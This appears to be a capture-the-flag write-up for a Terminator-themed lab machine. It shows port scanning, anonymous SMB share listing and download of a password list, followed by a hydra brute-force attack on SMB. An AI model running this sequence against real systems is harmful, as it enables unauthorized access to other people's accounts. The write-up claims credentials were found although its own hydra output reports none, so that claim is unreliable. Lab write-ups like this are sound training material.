## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
A vulnerable Terminator themed Linux machine.
Are you able to compromise this Terminator themed machine?
```

## IP-Address
```IP-Address
10.201.79.56
```

## RustScan
```bash
$ rustscan -a 10.201.19.239  -b 450 -t 2000 --ulimit 5000 -- -e tun0  -p80
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.201.19.239:22
Open 10.201.19.239:110
Open 10.201.19.239:80
Open 10.201.19.239:143
Open 10.201.19.239:139
Open 10.201.19.239:445
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -e tun0 -p80" on ip 10.201.19.239
```

## NMAP
```bash
$ nmap -sV 10.201.19.239 -A
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 22:22 EDT
Nmap scan report for 10.201.19.239
Host is up (0.28s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)                                                 
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)                  
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))                           
|_http-title: Skynet                                                               
|_http-server-header: Apache/2.4.18 (Ubuntu)                                       
110/tcp open  pop3        Dovecot pop3d                                            
|_pop3-capabilities: UIDL AUTH-RESP-CODE CAPA TOP PIPELINING RESP-CODES SASL       
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)              
143/tcp open  imap        Dovecot imapd                                            
|_imap-capabilities: more OK IMAP4rev1 ENABLE IDLE post-login listed ID SASL-IR capabilities Pre-login LOGINDISABLEDA0001 have LOGIN-REFERRALS LITERAL+            
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)          
Device type: general purpose                                                       
Running: Linux 4.X                                                                 
OS CPE: cpe:/o:linux:linux_kernel:4.4                                              
OS details: Linux 4.4                                                              
Network Distance: 5 hops                                                           
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel   
```
## SMBCLIENT 
```bash
$ smbclient -L ///10.201.19.239/
Password for [WORKGROUP\kali]: <empty>

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET
```
After that
```bash
$ smbclient \\\\10.201.19.239\\anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5830424 blocks available
smb: \> get attention.log
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \attention.log
smb: \> cat attention.log
cat: command not found
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> get logs
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \logs
smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

 9204224 blocks of size 1024. 5830312 blocks available
smb: \> get logs
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \logs
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 00:42:16 2019
  ..                                  D        0  Thu Nov 26 11:04:00 2020
  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
  log3.txt                            N        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5830296 blocks available
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \logs\> get log2.txt
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \logs\> get log3.txt
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \logs\> 
```

## Files Content
`Attention.txt`
```bash
$ cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```
`Log1.txt`
```bash
$ cat log1.txt     
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```
This File looks like a Passwords Files 
`Log2.txt`,`Log3.txt`
```bash
Both Files are Empty
┌──(kali㉿kali)-[~]
└─$ cat log2.txt
┌──(kali㉿kali)-[~]
└─$ cat log3.txt
```
## Brute-Force Password
```bash
$ hydra -l Miles -P log1.txt smb://10.201.19.239 -V -f
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-07 22:42:57
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 31 login tries (l:1/p:31), ~31 tries per task
[DATA] attacking smb://10.201.19.239:445/
[ATTEMPT] target 10.201.19.239 - login "Miles" - pass "cyborg007haloterminator" - 1 of 31 [child 0] (0/0)
[445][smb] Host: 10.201.19.239 Account: Miles Error: Invalid account (Anonymous success)
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-07 22:42:59
```
Got the Credentials for SMB 
```Credentials
SMB User: Miles
SMB PASS: [password omitted]
```


